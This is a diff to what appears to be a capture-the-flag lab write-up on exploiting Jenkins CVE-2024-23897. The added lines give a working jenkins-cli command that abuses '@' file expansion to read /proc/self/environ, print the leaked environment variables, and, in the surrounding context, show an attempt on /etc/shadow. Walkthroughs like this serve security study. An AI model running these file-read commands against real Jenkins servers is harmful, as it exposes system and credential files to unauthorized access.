@@ -73,7 +73,37 @@ The CLI misinterpreted the file content as multiple arguments due to the way the
 
 No contents for `java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/etc/shadow"`.
 
-Let' s keep exploiting the server with this command line. We can also enumerate the environment of the Jenkins server. Let' s target `/proc/self/environ`, a special file in the proc filesystem on Unix-like operating systems that contains the environment variables of the process that accesses it. 
+Let' s keep exploiting the server with this command line. We can also enumerate the environment of the Jenkins server. Let' s target `/proc/self/environ`, a special file in the proc filesystem on Unix-like operating systems that contains the environment variables of the process that accesses it. Type:
+
+```
+java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/proc/self/environ"
+```
+
+You will see the following outcome
+
+(pic9)
+
+(pic10)
+
+The outcome returned is a list of environment variables. At the end, the `help` command cannot interpretate `HOSTNAME=...`. So returns an error. Nonetheless, we obtain several paths and addresses.
+
+
+ERROR: No such command HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=
+
+https://updates.jenkins.io/experimental
+
+1. JAVA_HOME=/opt/java/openjdk
+2. JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals
+3. COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log
+4. PWD=/JENKINS_SLAVE_AGENT_PORT=50000
+5. JENKINS_VERSION=2.441
+6. HOME=/var/jenkins_home
+7. LANG=C.UTF-8
+8. JENKINS_UC=https://updates.jenkins.io
+9. SHLVL=0
+10. JENKINS_HOME=/var/jenkins_home
+11. REF=/usr/share/jenkins/ref
+12. PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 ?Nonetheless, we don' t find any example of how to implement it. So let's look on Google " CVE-2024-23897 proof of concept" and you will find the following site: https://github.com/3yujw7njai/CVE-2024-23897?
 
